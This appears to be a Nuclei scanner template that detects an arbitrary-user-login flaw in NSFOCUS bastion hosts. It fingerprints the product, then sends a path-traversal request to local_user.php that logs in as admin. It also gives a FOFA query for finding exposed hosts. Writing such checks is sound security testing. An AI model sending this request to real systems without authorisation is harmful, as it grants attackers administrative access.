flow: http(1) && http(2)
http:
- matchers:
  - condition: or
    dsl:
    - contains(tolower(body), 'nsfocus')
    - contains(header, 'NSFOCUS')
    internal: true
    type: dsl
  max-redirects: 2
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- matchers:
  - part: body
    type: word
    words:
    - 'status": 200'
  - part: content_type
    type: word
    words:
    - application/json
  matchers-condition: and
  raw:
  - 'GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
id: nsfocus-auth-bypass
info:
  author: ritikchaddha
  description: 'Nsfocus bastion host has an arbitrary user login vulnerability. Attackers
    can use the vulnerability to log in any user by including www/local_user.php

    '
  metadata:
    fofa-query: body="/needUsbkey.php?username=" && "NSFOCUS"
    max-request: 2
    verified: true
  name: Nsfocus - Arbitrary User Login
  reference:
  - https://forum.butian.net/article/251
  severity: high
  tags: nsfocus,auth-bypass,vuln
